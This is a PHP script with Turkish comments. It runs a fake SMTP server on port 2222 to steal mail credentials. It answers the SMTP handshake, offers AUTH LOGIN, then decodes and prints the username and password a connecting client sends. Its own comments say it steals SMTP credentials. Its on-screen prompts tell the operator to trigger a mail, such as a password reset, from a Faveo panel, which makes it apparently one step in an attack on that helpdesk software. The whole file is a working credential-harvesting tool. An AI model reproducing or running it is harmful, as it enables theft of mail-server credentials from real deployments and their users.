<?php
// fake_smtp.php
// Bu script 2222 portunu dinler ve gelen SMTP kimlik bilgilerini çalar.

set_time_limit(0);
ob_implicit_flush();

$address = '127.0.0.1';
$port = 2222;

// Soket oluştur
if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
    echo "socket_create() başarısız: " . socket_strerror(socket_last_error()) . "\n";
    exit;
}

// Portu bağla
if (socket_bind($sock, $address, $port) === false) {
    echo "socket_bind() başarısız. Port dolu olabilir: " . socket_strerror(socket_last_error($sock)) . "\n";
    exit;
}

// Dinlemeye başla
if (socket_listen($sock, 5) === false) {
    echo "socket_listen() başarısız: " . socket_strerror(socket_last_error($sock)) . "\n";
    exit;
}

echo "🕵️‍♂️  SAHTE SMTP SUNUCUSU ÇALIŞIYOR...\n";
echo "📡  $address:$port adresini dinliyorum.\n";
echo "⏳  Lütfen Faveo panelinden bir mail gönderilmesini sağlayın (örn: Şifremi Unuttum)...\n\n";

do {
    if (($msgsock = socket_accept($sock)) === false) {
        echo "socket_accept() başarısız: " . socket_strerror(socket_last_error($sock)) . "\n";
        break;
    }

    // SMTP Karşılama Mesajı
    $msg = "220 FakeSMTP Server Ready\r\n";
    socket_write($msgsock, $msg, strlen($msg));

    // İstemciden gelen verileri oku
    while (true) {
        $buf = socket_read($msgsock, 2048, PHP_NORMAL_READ);
        if (!$buf) break;
        
        $buf = trim($buf);
        echo "Gelen Veri: $buf\n";

        // SMTP Komutlarına basit cevaplar
        if (strpos($buf, 'HELO') === 0 || strpos($buf, 'EHLO') === 0) {
            $response = "250 Hello\r\n250-AUTH LOGIN PLAIN\r\n250 AUTH LOGIN PLAIN\r\n";
            socket_write($msgsock, $response, strlen($response));
        }
        elseif ($buf === 'AUTH LOGIN') {
            $response = "334 VXNlcm5hbWU6\r\n"; // Base64 "Username:"
            socket_write($msgsock, $response, strlen($response));
            
            // Kullanıcı Adını al
            $usernameEnc = trim(socket_read($msgsock, 2048, PHP_NORMAL_READ));
            echo "------------------------------------------------\n";
            echo "👤 KULLANICI ADI (Çözüldü): " . base64_decode($usernameEnc) . "\n";
            
            $response = "334 UGFzc3dvcmQ6\r\n"; // Base64 "Password:"
            socket_write($msgsock, $response, strlen($response));
            
            // ŞİFREYİ AL!
            $passwordEnc = trim(socket_read($msgsock, 2048, PHP_NORMAL_READ));
            echo "🔑 ŞİFRE (Çözüldü): " . base64_decode($passwordEnc) . "\n";
            echo "------------------------------------------------\n";
            
            echo "✅ GÖREV TAMAMLANDI! Script kapatılıyor.\n";
            socket_close($msgsock);
            break 2; // Döngüden çık
        }
        elseif ($buf === 'QUIT') {
            break;
        }
    }
    socket_close($msgsock);
} while (true);

socket_close($sock);
?>
